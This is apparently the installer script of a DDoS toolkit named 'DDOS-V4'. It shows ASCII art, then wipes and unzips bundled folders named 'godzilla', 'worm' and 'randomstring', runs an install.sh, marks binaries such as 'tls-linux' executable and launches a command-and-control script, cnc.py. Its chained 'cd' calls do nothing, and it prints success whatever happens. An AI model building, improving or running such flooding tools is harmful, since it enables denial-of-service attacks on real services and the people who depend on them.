import os
print("""
               \033[37m           ,MMM\033[35m8&&&.
               \033[37m      _...MMMMM\033[35m88&&&&..._
               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
               \033[37m     `''''MMMMM\033[35m88&&&&''''`
               \033[37m           'MMM\033[35m8&&&'
""")

print("""\33[0;32m[1] RUN\n[2] CANCEL\nWhich one do you use?""")

c = input(">>>: ")
if c == "1":
    os.system("rm -rf randomstring")
    os.system("rm -rf resources")
    os.system("rm -rf godzilla")
    os.system("rm -rf worm")
    os.system("unzip randomstring.zip")
    os.system("rm -rf randomstring.zip")
    os.system("unzip resources.zip")
    os.system("rm -rf resources.zip")
    os.system("unzip godzilla.zip")
    os.system("rm -rf godzilla.zip")
    os.system("unzip worm.zip")
    os.system("rm -rf worm.zip")
    os.system("cd resources && bash install.sh")
    os.system("cd")
    os.system("cd DDOS-V4")
    os.system("cd godzilla && chmod +x *")
    os.system("cd")
    os.system("cd DDOS-V4")
    os.system("cd randomstring && chmod +x screetvip")
    os.system("cd")
    os.system("cd DDOS-V4")
    os.system("cd worm && chmod +x tls-linux")
    os.system("cd")
    os.system("cd DDOS-V4")
    os.system("python3 cnc.py")

elif c == "2":
    os.system("clear")

print("\33[0;32m[ √ ] S U C C E S S F U L L Y")
